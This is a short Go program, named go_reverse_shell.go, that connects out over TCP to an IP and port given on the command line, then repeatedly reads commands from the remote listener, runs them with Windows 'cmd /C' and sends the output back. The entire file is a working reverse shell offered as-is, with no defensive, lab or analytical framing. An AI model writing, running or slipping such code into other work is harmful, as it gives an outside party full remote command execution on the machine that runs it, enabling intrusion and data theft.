package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: go_reverse_shell.go IP PORT")
		return
	}

	ip := os.Args[1]
	port := os.Args[2]

	conn, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer conn.Close()

	for {
		// Read command from the listener
		message, _ := bufio.NewReader(conn).ReadString('\n')
		message = strings.TrimSpace(message)

		// Execute command
		cmd := exec.Command("cmd", "/C", message)
		output, _ := cmd.CombinedOutput()

		// Send output to the listener
		conn.Write([]byte(output))
	}
}
